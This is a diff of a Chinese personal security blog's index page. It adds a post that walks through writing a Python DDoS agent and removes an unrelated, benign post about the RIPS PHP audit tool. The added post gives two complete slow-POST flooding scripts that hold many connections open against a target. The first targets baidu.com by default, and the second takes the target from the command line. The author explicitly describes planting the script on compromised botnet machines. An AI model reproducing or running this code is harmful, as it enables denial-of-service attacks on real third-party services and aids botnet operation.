@@ -258,6 +258,197 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/04/基于python的ddos工具/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/06/04/基于python的ddos工具/" itemprop="url">
+                  基于python的ddos工具
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-04T11:55:01+08:00">
+                2018-06-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/06/04/基于python的ddos工具/" class="leancloud_visitors" data-flag-title="基于python的ddos工具">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-ddos"><a href="#0x00-ddos" class="headerlink" title="0x00 ddos"></a>0x00 ddos</h2><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p>
+<p>这里我选择用python来写安装在肉鸡上的代理程序。</p>
+<h2 id="0x01-需要安装的库"><a href="#0x01-需要安装的库" class="headerlink" title="0x01 需要安装的库"></a>0x01 需要安装的库</h2><ul>
+<li>socket: Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。</li>
+<li>time: 在产生错误时我们可以sleep一个时间来查看错误。</li>
+<li>threading： 多线程的库，增加我们的请求量。</li>
+<li>optparse： 此模块用来处理命令行参数，使我们在统一管理时更方便。</li>
+</ul>
+<h2 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h2><p>我们先不加命令行参数写一个，方便调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#python3.6</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">MAX_CONN=10</span><br><span class="line">PORT=80</span><br><span class="line">HOST=&quot;www.baidu.com&quot;</span><br><span class="line">PAGE=&quot;/&quot;</span><br><span class="line"></span><br><span class="line">data=(&quot;POST %s HTTP/1.1\r\n&quot;</span><br><span class="line">&quot;Host: %s\r\n&quot;</span><br><span class="line">&quot;Content-Length: 1000000000\r\n&quot;</span><br><span class="line">&quot;Cookie: ddos_test\r\n&quot;</span><br><span class="line">&quot;\r\n&quot; % (PAGE,HOST))</span><br><span class="line"></span><br><span class="line">data2=data.encode(&apos;utf-8&apos;)</span><br><span class="line"></span><br><span class="line">socks=[]</span><br><span class="line"></span><br><span class="line">def conn_thread():</span><br><span class="line">    global socks</span><br><span class="line">    for i in range(0,MAX_CONN):</span><br><span class="line">        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        try:</span><br><span class="line">            s.connect((HOST,PORT))</span><br><span class="line">            s.send(data2)</span><br><span class="line">            print(&quot;[+] Send data OK!,conn=%d\n&quot; % i)</span><br><span class="line">            socks.append(s)</span><br><span class="line">        except:</span><br><span class="line">            print (&quot;[-] Could not connect to server or send error&quot;)</span><br><span class="line">            time.sleep(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_thread():</span><br><span class="line">    global socks</span><br><span class="line">    while True:</span><br><span class="line">        for s in socks:</span><br><span class="line">            try:</span><br><span class="line">                s.send(b&quot;f&quot;)</span><br><span class="line">                print (&quot;[+] send OK! %s&quot;%s)</span><br><span class="line">            except:</span><br><span class="line">                print (&quot;[-] send error\n&quot;)</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn_th=threading.Thread(target=conn_thread,args=())</span><br><span class="line">send_th=threading.Thread(target=send_thread,args=())</span><br><span class="line">conn_th.start()</span><br><span class="line">send_th.start()</span><br></pre></td></tr></table></figure>
+<p>这里我们仅设置了10个最大连接数，然后向百度的80端口不断发送post请求。</p>
+<p>效果如下：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos01.png" alt=""></p>
+<h2 id="0x03-增加命令行参数"><a href="#0x03-增加命令行参数" class="headerlink" title="0x03 增加命令行参数"></a>0x03 增加命令行参数</h2><p>实际情况中，我们经常要把ddos脚本放在我们已经控制的僵尸网络中，控制大量的计算机启动脚本，我们肯定不能每切换攻击一个目标就对代码中的参数更改一次，所以我们要使目标ip，端口，页面，以及攻击的强度通过我们输入参数来更改，为实现这个目标，我们导入optparse库接收命令行参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#python3.6</span><br><span class="line"></span><br><span class="line">#用例：python ddos.py -w &quot;www.hao123.com&quot; -p 80 -n 200 --page &quot;/&quot;</span><br><span class="line">#-h查看帮助</span><br><span class="line">#-w参数和-p参数不可缺省</span><br><span class="line"></span><br><span class="line">import optparse</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">socks=[]</span><br><span class="line"></span><br><span class="line">def conn_thread(PORT,HOST,data2,MAX_CONN):</span><br><span class="line">    global socks</span><br><span class="line">    for i in range(0,MAX_CONN):</span><br><span class="line">        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        try:</span><br><span class="line">            s.connect((HOST,PORT))</span><br><span class="line">            s.send(data2)</span><br><span class="line">            print(&quot;[+] Send data OK!,conn=%d\n&quot; % i)</span><br><span class="line">            socks.append(s)</span><br><span class="line">        except:</span><br><span class="line">            print (&quot;[-] Could not connect to server or send error&quot;)</span><br><span class="line">            time.sleep(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_thread():</span><br><span class="line">    global socks</span><br><span class="line">    while True:</span><br><span class="line">        for s in socks:</span><br><span class="line">            try:</span><br><span class="line">                s.send(b&quot;f&quot;)</span><br><span class="line">                print (&quot;[+] send OK! %s&quot;%s)</span><br><span class="line">            except:</span><br><span class="line">                print (&quot;[-] send error\n&quot;)</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    MAX_CONN = 10</span><br><span class="line">    PORT = 80</span><br><span class="line">    HOST = &quot;www.baidu.com&quot;</span><br><span class="line">    PAGE = &quot;/&quot;</span><br><span class="line">    MAX_CONN = 10</span><br><span class="line"></span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(&apos;-w&apos;, dest=&apos;HOST&apos;, type=&apos;string&apos;, help=&quot;IP address or Website&quot;)</span><br><span class="line">    parser.add_option(&apos;-p&apos;, dest=&apos;PORT&apos;, type=&apos;int&apos;, help=&quot;Port num&quot;)</span><br><span class="line">    parser.add_option(&apos;-n&apos;, dest=&apos;MAX_CONN&apos;, type=&apos;int&apos;, help=&quot;Max connect num&quot;)</span><br><span class="line">    parser.add_option(&apos;--page&apos;, dest=&apos;PAGE&apos;, type=&apos;string&apos;, help=&quot;Url page&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    if(options.HOST==None)|(options.PORT==None):</span><br><span class="line">        print(&apos;---wrong input!---&apos;+&apos;\n&apos;)</span><br><span class="line">        exit(0)</span><br><span class="line">    else:</span><br><span class="line">        HOST = options.HOST</span><br><span class="line">        PORT = options.PORT</span><br><span class="line">    if(options.PAGE):</span><br><span class="line">        PAGE = options.PAGE</span><br><span class="line">    if(options.MAX_CONN):</span><br><span class="line">        MAX_CONN = options.MAX_CONN</span><br><span class="line"></span><br><span class="line">    data = (&quot;POST %s HTTP/1.1\r\n&quot;</span><br><span class="line">            &quot;Host: %s\r\n&quot;</span><br><span class="line">            &quot;Content-Length: 1000000000\r\n&quot;</span><br><span class="line">            &quot;Cookie: ddos_test\r\n&quot;</span><br><span class="line">             &quot;\r\n&quot; % (PAGE, HOST))</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    print(&quot;MAX_CONN=&#123;0&#125;&quot;.format(MAX_CONN))</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    data2 = data.encode(&apos;utf-8&apos;)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    conn_th=threading.Thread(target=conn_thread,args=(PORT,HOST,data2,MAX_CONN))</span><br><span class="line">    send_th=threading.Thread(target=send_thread,args=())</span><br><span class="line">    conn_th.start()</span><br><span class="line">    send_th.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ ==&apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>我们通过optparse库读取命令行输入参数，其中host和port是必要参数，max_conn和page是可选参数。</p>
+<p>效果如下：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos02.png" alt=""></p>
+<p>我们植入肉鸡后，就可以通过命令行调用程序并选择攻击目标了。</p>
+<h2 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h2><p>blog中所有写好的工具，以及常用的木马、字典，都放在<br><a href="https://github.com/echohun/tools" target="_blank" rel="noopener">https://github.com/echohun/tools</a> 感兴趣的大佬们可以star一下，十分感激。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/SSTI服务器模板注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2420,210 +2611,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/11/PHP代码审计工具RIPS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/11/PHP代码审计工具RIPS/" itemprop="url">
-                  PHP代码审计工具RIPS
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-11T12:31:13+08:00">
-                2018-05-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/11/PHP代码审计工具RIPS/" class="leancloud_visitors" data-flag-title="PHP代码审计工具RIPS">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-代码审计工具RIPS"><a href="#0x00-代码审计工具RIPS" class="headerlink" title="0x00 代码审计工具RIPS"></a>0x00 代码审计工具RIPS</h2><p>在安全工作中，代码审计是很重要的一项技能。在面对大规模的代码时，<br>使用自动化工具辅助人工漏洞挖掘，可以显著提高审计工作的效率。学会利用自动化代码审计工具，是每一个代码审计人员必备的能力。</p>
-<p>博主在代码审计过程中选择使用RIPS，它使用了静态分析技术，能够自动化地挖掘PHP源代码潜在的安全漏洞如XSS ，sql注入，敏感信息泄漏，文件包含等常见漏洞；也可以采用正则方式扫描代码发现漏洞；还能够采用自定义的语法扫描代码发现问题。渗透测试人员可以直接容易的审阅分析结果，而不用审阅整个程序代码。当然，最后去校验结果必须是我们自己去做的。</p>
-<h2 id="0x01-安装与配置"><a href="#0x01-安装与配置" class="headerlink" title="0x01 安装与配置"></a>0x01 安装与配置</h2><p>rips官网：<a href="http://rips-scanner.sourceforge.net/" target="_blank" rel="noopener">http://rips-scanner.sourceforge.net/</a><br>我们下载最新版本的rips之后，将压缩包解压后放在本地网站根目录下，通过浏览器（最好是firefox，因为rips宣称只支持firefox）访问即可使用。</p>
-<h2 id="0x02-主界面介绍"><a href="#0x02-主界面介绍" class="headerlink" title="0x02 主界面介绍"></a>0x02 主界面介绍</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips01.png" alt=""></p>
-<ul>
-<li>subdirs：如果勾选上这个选项，会扫描所有子目录，否则只扫描一级目录，缺省为勾选。</li>
-<li>verbosity level：选择扫描结果的详细程度，缺省为1(建议就使用1)。</li>
-<li>vuln type：选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，缺省为全部扫描。</li>
-<li>code style：选择扫描结果的显示风格（支持9种语法高亮）。</li>
-<li>/regex/：使用正则表达式过滤结果。</li>
-<li>path/file： 要扫描的目录。</li>
-<li>scan： 开始扫描。</li>
-</ul>
-<p>主界面就这些功能按键，我们接下来尝试一下。</p>
-<h2 id="0x03-实践"><a href="#0x03-实践" class="headerlink" title="0x03 实践"></a>0x03 实践</h2><p>在路径处输入我搭建的各种渗透测试环境的网页根目录，然后点击scan，稍等一会就会出现全部结果，并以图表的方式弹出一个总结的结果页面。</p>
-<p>我们可以发现，198个文件就报告了163个疑似漏洞的代码。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips02.png" alt=""></p>
-<p>然后我们看这些报告</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips03.png" alt=""></p>
-<p>点击每一个代码块左上角的书页小图标，就会展开这个代码的详情。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips04.png" alt=""></p>
-<p>点击每一个代码块左上角的红色小图标，可以生成漏洞的利用代码。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips05.png" alt=""></p>
-<p>将生成的php代码放在php文件里面传入参数就可以运行</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips06.png" alt=""></p>
-<p>点击每一个代码块左上角的问号小图标，就会展开这个漏洞的详情、原理。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips07.png" alt=""></p>
-<p>同样，问号中还有漏洞的解决方案和更安全的范例代码书写方法。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips08.png" alt=""></p>
-<p>总是将期望的字符串嵌入到引号中，并在将其嵌入查询之前使用PHP构建函数将字符串转义。 </p>
-<p>始终嵌入不带引号的预期整数，并在将数据嵌入查询之前将数据转换为整数。 </p>
-<p>转义数据但嵌入不带引号并不安全。</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>方便使用的工具十分重要，但同时工具也只是帮我们更快速的筛选一遍有可能出现问题的地方，然后我们需要做的就是自己去审计，将真正有隐患的地方寻找出来并提出解决方案。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2673,7 +2660,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">98</span>
+                <span class="site-state-item-count">99</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
